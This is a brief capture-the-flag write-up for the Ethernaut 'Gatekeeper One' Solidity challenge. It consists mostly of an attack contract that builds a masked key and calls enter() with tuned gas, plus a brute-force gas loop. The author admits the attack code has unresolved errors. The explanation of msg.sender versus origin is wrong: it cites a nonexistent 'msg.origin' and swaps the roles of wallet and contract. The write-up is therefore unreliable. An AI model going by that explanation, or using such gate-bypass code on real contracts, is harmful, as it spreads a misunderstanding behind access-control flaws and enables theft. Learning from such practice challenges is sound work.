# Ethernaut challenge 12 Gate keeper one

The attack code: 

```
contract VaultAttack {
    GatekeeperOne gate;
    bytes8 public key;

    constructor(address _address) public {
        gate = GatekeeperOne(_address);
        key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
    }

    function attack() external {
        gate.call.gas(56348)(bytes4(keccak256('enter(bytes8)')), key);
    }
}
```

A few things to note:
- There is an issue with converting type address to type bytes8 (this needs to be resolved)
- There is a syntax issues with called `enter` in the attack function (this needs to be resolved)

Solution:

Passing the multiple require statements or 'gates' reqwuires understanding of a few interesting topics.

- Masking
- `msg.sender` v `msg.origin`
- Gas/specific opcode

### Masking

We will use the `&` bit wise operator to conceal or reveal specific bytes. This will create the `key`
Read more here: https://docs.soliditylang.org/fr/latest/types.html?highlight=bitwise

### sender, origin

We have used contracts throughout these challenges. While the `msg.sender` will be our EOA (wallet) address, the `msg.origin` will be the contract address that actually calls the `enter` function.

### Gas/opcodes

Each opcode requires a specific amount of gas to run. Because the last gate requires the sent gas to be a multiple of 8191(seen in this line: `gasleft().mod(8191) == 0);`) we must do some work to figure out what we need to send.

Method 1: Brute force:

```
for (uint256 i = 0; i <= 8191; i++) {
    try victim.enter{gas: 800000 + i}(gateKey) {
        console.log("passed with gas ->", 800000 + i);
        break;
    } catch {}
}
```
The above code has been borrowed from a blog

Method 2: Run and inspect:

We cam take our best guess at the value and then debug/inspect the gas used, do the math and pass the correct value on the second run.